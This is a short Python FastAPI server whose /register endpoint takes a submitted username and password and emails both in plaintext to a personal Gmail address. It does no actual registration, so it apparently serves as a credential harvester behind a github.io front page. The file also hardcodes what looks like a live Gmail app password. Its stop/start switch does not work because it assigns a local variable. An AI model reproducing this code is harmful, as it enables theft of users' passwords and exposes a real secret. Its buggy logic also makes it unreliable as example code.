import os
import logging
import yagmail
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

# Initialize FastAPI app
app = FastAPI()

# Allow specific origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://martvio.github.io"],  # Replace with your front-end URL
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Email configuration
sender_email = "shs956899@gmail.com"
app_password = "ubll nues ykvt ukoa"  # Replace with your app-specific password if 2FA is enabled
receiver_email = "shs956899@gmail.com"

Continue = True
# Define the data model for the JSON body
class User(BaseModel):
    username: str
    password: str

# Route to handle user registration and email sending
@app.post("/register")
async def register_user(user: User):
    if not Continue:
        return {"404"}
    
    logger.info("Received request to register user")

    if not user.username or not user.password:
        logger.warning("Username or password missing")
        raise HTTPException(status_code=400, detail="Username and password are required")

    try:
        # Construct the email body and subject
        subject = "A new user has signed up on your website"
        body = f"Username: {user.username} || Password: {user.password}"

        # Initialize yagmail with your credentials
        yag = yagmail.SMTP(sender_email, app_password)

        # Send the email
        try:
            yag.send(to=receiver_email, subject=subject, contents=body)
            logger.info("Email sent successfully!")
        except Exception as e:
            logger.error(f"Failed to send email: {e}")
            raise HTTPException(status_code=500, detail="Failed to send email")

        return {"message": "User registered and email sent successfully"}
    except Exception as e:
        logger.error(f"Error in registering user: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/stop")
async def stop():
    Continue = False
    logger.info("the api is stoped")
    return {"the api stoped"}

@app.post("/start")
async def start():
    Continue = True
    logger.info("the api is started")
    return {"the api start"}
# Start FastAPI server if running as main module
if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
